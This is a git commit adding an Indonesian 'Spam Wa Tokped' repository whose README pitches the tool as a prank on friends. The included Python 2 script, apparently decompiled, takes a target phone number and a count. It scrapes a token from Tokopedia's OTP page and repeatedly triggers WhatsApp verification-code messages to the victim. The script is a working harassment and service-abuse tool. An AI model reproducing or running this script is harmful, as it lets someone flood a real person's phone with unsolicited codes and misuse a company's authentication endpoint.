6034c00497e80e68511eb235120f3b3ba54b6b7b
Datez <56632970+Datez-Kun@users.noreply.github.com>
2020-07-07 00:41:41 +0700

    https://github.com/B4N954N2-ID/SpamWa

---
+++ SpamWa/README.md
@@ -0,0 +1,15 @@
+# Spam Wa Tokped
+
+```
+
+Script spam wa otp tokped cocok untuk ngeprank temen lu yg suka maen game online!
+Pasti auto ngamuk sama auto baku hantam dah wkwk :v
+
+```
+# Info
+```
+
+Jika terjadi apa2 resikonya tidak ditanggung oleh Author.
+Jadi gunakan dg bijak script ini!
+
+```
---
+++ SpamWa/spam-wa_open.py
@@ -0,0 +1,78 @@
+# Filenames : <Sazxt>
+# python bytecode : 2.7
+# Time Succses Parser : Mon Jul  6 13:30:25 2020
+# Auto Parser Dis Version : 1.1.0
+# Source : https://www.github.com/Datez-Kun
+
+hii = '\x1b[4;32m'
+b = '\x1b[34;1m'
+pu = '\x1b[37;1m'
+k = '\x1b[33;1m'
+m = '\x1b[31;1m'
+h = '\x1b[32;1m'
+u = '\x1b[35;1m'
+bi = '\x1b[36;1m'
+hi = '\x1b[30;1m'
+p = '\x1b[0m'
+j = '\x1b[1;38;5;208m'
+from requests import ConnectionError
+from time import sleep
+import requests, sys, os, re, random, time
+os.system('clear')
+os.system('xdg-open https://youtube.com/SanzSoekamti')
+
+def meki():
+    ngeue = [
+     '', '.', '..', '...']
+    for x in ngeue:
+        print '\r\x1b[1;92m[' + pu + '+' + h + '] \x1b[1;93mProses\x1b[0m' + x,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+time.sleep(10)
+os.system('clear')
+print u + '                                   \xe2\x95\x94\xe2\x95\xbc'
+print j + '  /\\    ' + bi + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97     ' + u + '\xe2\x95\xbe\xe2\x95\x97 ' + pu + '\xe2\x97\x8f ' + u + '\xe2\x95\x91 \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
+print j + ' /  \\   ' + bi + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\xbd \xe2\x95\x91  ' + j + '\xc2\xab-\xc2\xbb ' + u + '\xe2\x95\x91 \xe2\x95\xa5 \xe2\x95\x91 \xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3'
+print j + ' |' + u + '**' + j + '|  ' + bi + '\xe2\x95\xbc\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xbf  \xe2\x95\xbc\xe2\x95\x9d  \xe2\x95\xbf\xe2\x95\xa9   \xe2\x95\x9a\xe2\x95\xbe     ' + u + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xbe\xe2\x95\x9d  \xe2\x95\xa9' + k + ' TokPed'
+print j + ' |' + p + '--' + j + '|  ' + m + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
+print j + '/[==]\\ ' + m + '\xe2\x95\x91 ' + h + 'Author' + m + ': ' + pu + 'Sanz ' + hi + 'X ' + h + 'Youtube' + m + ': ' + pu + 'SANZ SOEKAMTI ' + m + '\xe2\x95\x91'
+print j + '|/' + bi + '\xe2\x80\xa2\xe2\x80\xa2' + j + '\\| ' + m + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
+print pu + '             <' + m + '/' + pu + '> ' + hi + 'New Spam Wa (3x/Jam) ' + pu + '<' + m + '/' + pu + '>'
+print h + '\n[' + pu + '\xc3\x97' + h + '] ' + k + 'Contoh ' + m + ': ' + p + '085xxxxxxxxx'
+NO = raw_input(h + '[' + pu + '+' + h + '] ' + k + 'Target ' + m + ':' + p + ' ')
+JML = input(h + '[' + pu + '+' + h + '] ' + k + 'Jumlah Spam ' + m + ': ' + p)
+print pu + '-----------------------------'
+meki()
+print pu + '\n-----------------------------'
+for x in range(JML):
+    try:
+        headers = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 
+           'Origin': 'https://accounts.tokopedia.com', 
+           'X-Requested-With': 'XMLHttpRequest', 
+           'User-Agent': '{acak}', 
+           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
+           'Accept-Encoding': 'gzip, deflate'}
+        site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + NO + '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers=headers).text
+        search = re.search('\\<input\\ id\\=\\"Token\\"\\ value\\=\\"(.*?)\\"\\ type\\=\\"hidden\\"\\>', site).group(1)
+        data = {'otp_type': '116', 
+           'msisdn': NO, 
+           'tk': search, 
+           'email': '', 
+           'original_param': '', 
+           'user_id': '', 
+           'signature': '', 
+           'number_otp_digit': '6'}
+        sleep(30)
+        sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=data)
+        if 'Anda sudah melakukan 3 kali pengiriman kode' in sending.text:
+            print m + '[' + pu + '!' + m + '] ' + p + 'Pengiriman sudah limit 3 kali'
+            print m + '[' + pu + '!' + m + '] ' + p + 'Tunggu 1 jam Untuk Mengirim Lagi' + m + '!!'
+            exit()
+        else:
+            print h + '[' + pu + '\xe2\x9c\x93' + h + '] ' + pu + 'Spam WhatsApp ' + k + NO + ' ' + m + '[' + h + ' Success ' + m + ']'
+    except ConnectionError:
+        print m + '[' + pu + '!' + m + '] ' + p + 'Tidak Ada Koneksi' + m + '!!'
+        exit()
+# okay decompiling out.pyc
